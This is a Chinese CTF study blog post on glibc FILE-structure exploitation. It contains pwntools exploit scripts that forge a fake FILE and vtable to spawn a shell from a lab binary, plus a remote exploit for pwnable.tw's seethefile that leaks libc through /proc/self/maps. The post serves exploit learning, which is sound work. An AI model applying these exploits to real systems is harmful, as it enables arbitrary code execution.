---
title: IO_FILE学习笔记
date: 2022-9-15 20:32:00 +0800
author: sirius
categories: [CTF, pwn]
tags: [CTF, pwn]
math: false
typora-root-url: ../../SiriusHsh.github.io
typora-copy-images-to: ../assets/img/2022
---



跟着angelboy [这个视频](https://www.youtube.com/watch?v=_ZnnGZygnzE) 的节奏，学习一下文件利用的基本操作，ppt里有的内容全都不写了，直接看ppt吧。



## 0x01 IO_FILE利用简单入门

example.c如下：

```c
#include<stdio.h>
#include<stdlib.h>

char buf[0x100] = {0};
FILE *fp;
int main(){
   fp = fopen("./file.txt", "rw");
   gets(buf);
   fclose(fp);
}
```

在glibc2.23下编译，[获取样例程序](/assets/file/baby_file)

为了方便调试，把PIE和ASLR关了

```sh
❯ cat /proc/sys/kernel/randomize_va_space
0
❯ checksec ./baby_file
[*] '/home/sirius/ctf/file_structure/baby_file'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/'
```

程序很明显有一个缓冲区溢出，buf可以溢出，越界写到fp

利用思路就是越界写fp，使fp指向buf。因为buf是可以随意构造的，就可以随意的伪造file structure了。如下图，buf中全填A时，最后会call到一个fake vtable，fake vtable是AAAAAAAA。（file structure这些基础知识不讲了，这里只讲利用，不懂的去看angelboy的[材料1](https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf)和[材料2](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique))

![image-20221206113503491](/assets/img/2022/image-20221206113503491.png)

于是poc如下：

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

r = process("./baby_file")

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']
def debug(cmd=''):
    gdb.attach(r, cmd)
    pause()

debug()
buf = 0x601060
p = 'a'*0x100 + p64(buf)
r.sendline(p)

r.interactive()
```

结果失败，没有控制RIP

```sh
*RAX  0x61616161
*RBX  0x601060 (buf) ◂— 0x6161616161616161 ('aaaaaaaa')
*RCX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*RDX  0x6161616161616161 ('aaaaaaaa')
*RDI  0x601060 (buf) ◂— 0x6161616161616161 ('aaaaaaaa')
*RSI  0x602348 ◂— 0xa /* '\n' */
*RBP  0x7fffffffe090 —▸ 0x400630 (__libc_csu_init) ◂— push   r15
*RSP  0x7fffffffe070 ◂— 0x0
*RIP  0x7ffff7a7a39c (fclose+300) ◂— cmp    r8, qword ptr [rdx + 8]
─────────────────────────────[ DISASM ]──────────────────────────────
 ► 0x7ffff7a7a39c <fclose+300>    cmp    r8, qword ptr [rdx + 8]
   0x7ffff7a7a3a0 <fclose+304>    je     fclose+370                <fclose+370>
    ↓
   0x7ffff7a7a3e2 <fclose+370>    add    dword ptr [rdx + 4], 1
   0x7ffff7a7a3e6 <fclose+374>    mov    edx, eax
   0x7ffff7a7a3e8 <fclose+376>    and    edx, 0x8000
   0x7ffff7a7a3ee <fclose+382>    test   ah, 0x20
```

如slide中所讲，需要先bypass掉`_lock`

### file structure中_lock的offset获取方法

```sh
pwndbg> p *(struct _IO_FILE_plus *) 0x7ffff7dd18e0   # 0x7ffff7dd18e0是stdin地址，如果只是算offset，不关心结构体里内容的话，这个地址可以随便写
$6 = {
  file = {
    _flags = -72540024,
    _IO_read_ptr = 0x602349 "",
    _IO_read_end = 0x602349 "",
    _IO_read_base = 0x602240 'a' <repeats 200 times>...,
    _IO_write_base = 0x602240 'a' <repeats 200 times>...,
    _IO_write_ptr = 0x602240 'a' <repeats 200 times>...,
    _IO_write_end = 0x602240 'a' <repeats 200 times>...,
    _IO_buf_base = 0x602240 'a' <repeats 200 times>...,
    _IO_buf_end = 0x603240 "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x0,
    _fileno = 0,
    _flags2 = 0,
    _old_offset = -1,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x7ffff7dd3790 <_IO_stdfile_0_lock>,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x7ffff7dd19c0 <_IO_wide_data_0>,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = -1,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7dd06e0 <_IO_file_jumps>
}
pwndbg> p &(*(struct _IO_FILE_plus *) 0x7ffff7dd18e0)->file->_lock
$10 = (_IO_lock_t **) 0x7ffff7dd1968 <_IO_2_1_stdin_+136>
pwndbg> p/x 0x7ffff7dd1968-0x7ffff7dd18e0
$11 = 0x88
```

计算buf_addr开始，_lock的地址，然后两值一减就是offset了： `p &(*(struct _IO_FILE_plus *) buf_addr)->file->_lock`

当然每次打一长串还是挺麻烦的，如果有安装pwngdb插件的话，fp命令还是挺方便的

```sh
pwndbg> fp 0x601060
$13 = {
  file = {
    _flags = 1633771873,
    _IO_read_ptr = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_read_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_read_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_write_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_write_ptr = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_write_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_buf_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_buf_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_save_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_backup_base = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _IO_save_end = 0x6161616161616161 <error: Cannot access memory at address 0x6161616161616161>,
    _markers = 0x6161616161616161,
    _chain = 0x6161616161616161,
    _fileno = 1633771873,
    _flags2 = 1633771873,
    _old_offset = 7016996765293437281,
    _cur_column = 24929,
    _vtable_offset = 97 'a',
    _shortbuf = "a",
    _lock = 0x6161616161616161,
    _offset = 7016996765293437281,
    _codecvt = 0x6161616161616161,
    _wide_data = 0x6161616161616161,
    _freeres_list = 0x6161616161616161,
    _freeres_buf = 0x6161616161616161,
    __pad5 = 7016996765293437281,
    _mode = 1633771873,
    _unused2 = 'a' <repeats 20 times>
  },
  vtable = 0x6161616161616161
}
pwndbg> p &$13->file->_lock
$14 = (_IO_lock_t **) 0x6010e8 <buf+136>
pwndbg> p/x 136
$15 = 0x88
```

于是修改poc：

```python
p = 'a'*0x88 + p64(buf+0x500)
p = p.ljust(0x100) + p64(buf)
```

运行结果：

```sh
─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
*RAX  0x0
*RBX  0x601060 (buf) ◂— 'a`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
*RCX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*RDX  0x6161616161616161 ('aaaaaaaa')
*RDI  0x6161616161616161 ('aaaaaaaa')
*RSI  0x1
*RBP  0x0
*RSP  0x7fffffffdff0 ◂— 0x0
*RIP  0x7ffff7a91562 (free+34) ◂— mov    rax, qword ptr [rdi - 8]
───────────────────────────────────────[ DISASM ]───────────────────────────────────────
 ► 0x7ffff7a91562 <free+34>     mov    rax, qword ptr [rdi - 8]
   0x7ffff7a91566 <free+38>     lea    rsi, [rdi - 0x10]
   0x7ffff7a9156a <free+42>     test   al, 2
   0x7ffff7a9156c <free+44>     jne    free+96                <free+96>
    ↓
   0x7ffff7a915a0 <free+96>     mov    edx, dword ptr [rip + 0x33fbee] <mp_+52>
```

发现并没有**call [rax+0x10]**，会进入free

### 如何call [rax+0x10]?

实际运行流程图：

![file_structure.drawio](/assets/img/2022/file_structure.drawio.svg)



主要还是file structure中一些值的影响，改变了程序逻辑，使得没有做到预期的分支。

那么如何获得`call [rax+0x10]`呢，见上图所示

答案是原先payload中开头padding部分 `"a"*0x88` 改成 `"a".ljust(0x88, "\x00")`

poc改为：

```python
p = 'a'.ljust(0x88, '\x00') + p64(buf+0x500)
p = p.ljust(0x100) + p64(buf)
```

运行结果：

```sh
─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
*RAX  0x2020202020202020 ('        ')
*RBX  0x601060 (buf) ◂— 0x61 /* 'a' */
*RCX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*RDX  0x601560 ◂— 0x0
*RDI  0x601060 (buf) ◂— 0x61 /* 'a' */
*RSI  0x0

*RBP  0xffffffff
*RSP  0x7fffffffe070 ◂— 0x0
*RIP  0x7ffff7a7a2ac (fclose+60) ◂— call   qword ptr [rax + 0x10]
───────────────────────────────────────[ DISASM ]───────────────────────────────────────
 ► 0x7ffff7a7a2ac <fclose+60>     call   qword ptr [rax + 0x10]

   0x7ffff7a7a2af <fclose+63>     mov    eax, dword ptr [rbx + 0xc0]
   0x7ffff7a7a2b5 <fclose+69>     test   eax, eax
   0x7ffff7a7a2b7 <fclose+71>     jle    fclose+496                <fclose+496>
```

成功控制了RIP

分析为什么可以获得`call [rax+0x10]`，`_IO_new_fclose`源码如下：

![image-20220922221007513](/assets/img/2022/image-20220922221007513.png)

所以关键是`_flags`这个值，会影响进不进`_IO_file_close_it`

还是见上图，第二种情况，payload是`'/bin/sh'.ljust(0x88, '\x00')`时，会获得一次`call [rax+0x88]`，这个是`vtable->_close`

poc：

```python
p = '/bin/sh'.ljust(0x88, '\x00') + p64(buf+0x50)
p = p.ljust(0x100) + p64(buf)
```

运行结果：

```sh
─────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
*RAX  0x2020202020202020 ('        ')
*RBX  0x601060 (buf) ◂— 0x68732f6e69622f /* '/bin/sh' */
*RCX  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2088
*RDX  0x0
*RDI  0x601060 (buf) ◂— 0x68732f6e69622f /* '/bin/sh' */
*RSI  0x1

*RBP  0x0
*RSP  0x7fffffffe050 —▸ 0x601060 (buf) ◂— 0x68732f6e69622f /* '/bin/sh' */
*RIP  0x7ffff7a8696a (_IO_file_close_it+282) ◂— call   qword ptr [rax + 0x88]
───────────────────────────────────────[ DISASM ]───────────────────────────────────────
 ► 0x7ffff7a8696a <_IO_file_close_it+282>    call   qword ptr [rax + 0x88]

   0x7ffff7a86970 <_IO_file_close_it+288>    mov    ebp, eax
   0x7ffff7a86972 <_IO_file_close_it+290>    jmp    _IO_file_close_it+60                <_IO_file_close_it+60>

   0x7ffff7a86977 <_IO_file_close_it+295>    nop    word ptr [rax + rax]
```

`_IO_new_file_close_it`源码中的调用点如下：

![image-20220922223525729](/assets/img/2022/image-20220922223525729.png)

![image-20220922223611848](/assets/img/2022/image-20220922223611848.png)

我觉得输入/bin/sh开头的payload比较好利用

思路：

首先如上获得`call [rax+0x88]`，这个`rax`的地址是相对于buf偏移为`0xd8`的vtable。所以需要把vtable指到可以恶意构造的一块地方，称之为fake vtable。

然后再vtable+0x88的地址上写入system，由于此时rdi已经是/bin/sh了，所以直接可以拿到shell

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

r = process("./baby_file")

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']
def debug(cmd=''):
    gdb.attach(r, cmd)
    pause()

# debug()
buf = 0x601060
fake_vtable = buf+0x110
system_addr = 0x7ffff7a523a0 # PIE & ASLR off, only for debug 
p = '/bin/sh'.ljust(0x88, '\x00') + p64(buf+0x50) # bypass _lock
p = p.ljust(0xd8, '\x00') + p64(fake_vtable) # fake vtable
p = p.ljust(0x100, '\x00') + p64(buf) # overflow fp
p = p.ljust(0x110+0x88, '\x00') + p64(system_addr) # vtable->_close = system
r.sendline(p)

r.interactive()
```

## 0x02 pwnable.tw上的seethefile

file structure的构造基本和上面的入门题一模一样。程序有一个任意文件读取的功能，通过读取`proc/self/maps`获得libc地址

exp:

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

# r = process('./seethefile')
# libc = ELF('/home/sirius/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so')
r = remote('chall.pwnable.tw', 10200)
libc = ELF('./libc.so')

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']
def debug(cmd=''):
    gdb.attach(r, cmd)
    pause()

def my_open(filename):
    r.recvuntil("Your choice :")
    r.sendline('1')
    r.recvuntil("What do you want to see :")
    r.sendline(filename)

def my_read():
    r.recvuntil("Your choice :")
    r.sendline('2')

def my_write():
    r.recvuntil("Your choice :")
    r.sendline('3')

def my_close():
    r.recvuntil("Your choice :")
    r.sendline('4')

def my_exit(name):
    r.recvuntil("Your choice :")
    r.sendline('5')
    r.recvuntil("Leave your name :")
    r.sendline(name)

my_open('/proc/self/maps')
my_read()
my_write()

my_read()
my_write()
con = r.recvuntil('libc')
libc_addr = int(con.split('\n')[-1].split('-')[0], 16)
system_off = libc.symbols['system']
system_addr = libc_addr + system_off
log.success('libc_addr: 0x{:x}'.format(libc_addr))
log.success('system_addr: 0x{:x}'.format(system_addr))


# debug()
buf = 0x804b260 # size=0x20
fake_file_structure = buf+0x200
fake_vtable = buf+0x300
p = 'a'*0x20
p += p64(fake_file_structure)
p = p.ljust(0x200, '\x00') # padding to fake_file_structure
p += '/bin/sh'.ljust(0x48, '\x00') + p64(buf+0x500) # bypass _lock
p = p.ljust(0x200+0x94, '\x00') + p64(fake_vtable) # fake vtable
p = p.ljust(0x300+0x44, '\x00') # padding to fake vtable + 0x44
p += p64(system_addr) # vtable->_close

my_exit(p)
#r.sendline('cd /home/seethefile')  # 这几行IO不是很稳定
#r.sendline('./get_flag')
#r.sendline('Give me the flag')

r.interactive()
```

![image-20221207001822307](/assets/img/2022/image-20221207001822307.png)



## 0x04 house of orange (glibc 2.23)



## 0x05 house of orange (glibc 2.24)



## 0x06 WCTF 2017  wannaheap



## 0x07 HITCON 2017 : Ghost in The Heap



## 0x08 HCTF2017 babyprintf



## 0x09 House of Pig

###  **XCTF 2021 final**



## 0x10 house of apple

### pwn_oneday
